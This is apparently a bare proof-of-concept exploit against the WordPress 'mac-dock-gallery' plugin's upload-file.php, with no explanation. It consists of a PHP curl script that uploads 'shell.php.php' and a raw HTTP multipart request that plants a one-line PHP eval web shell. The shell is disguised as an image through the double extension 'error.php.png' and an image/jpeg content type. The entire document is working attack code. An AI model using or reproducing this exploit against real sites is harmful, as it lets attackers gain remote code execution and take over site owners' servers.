[PoC]
	<?php
		$u="shell.php.php";
		$c = curl_init("http://{TARGET}/wp-content/plugins/mac-dock-gallery/upload-file.php");
		curl_setopt($c, CURLOPT_POST, true);
		curl_setopt($c, CURLOPT_POSTFIELDS,
		array('uploadfile'=>"@$u",
		'albumId'=>"1",
		'mode'=>"image"));
		curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
		$e = curl_exec($c);
		curl_close($c);
		echo $e; 
	?>
[HTTP REQUEST]
	POST /{TARGET}/plugins/mac-dock-gallery/upload-file.php HTTP/1.1
	Host: {TARGET}
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Content-Type: multipart/form-data; boundary=---------------------------15571347328322
	Content-Length: 429
	Connection: close
	Upgrade-Insecure-Requests: 1
	-----------------------------15571347328322
	Content-Disposition: form-data; name="uploadfile"; filename="error.php.png"
	Content-Type: image/jpeg
	<?php
		@eval(@$_POST["error"]);
		
	-----------------------------15571347328322
	Content-Disposition: form-data; name="mode"
	image
	-----------------------------15571347328322
	Content-Disposition: form-data; name="albumId"
	1
	-----------------------------15571347328322--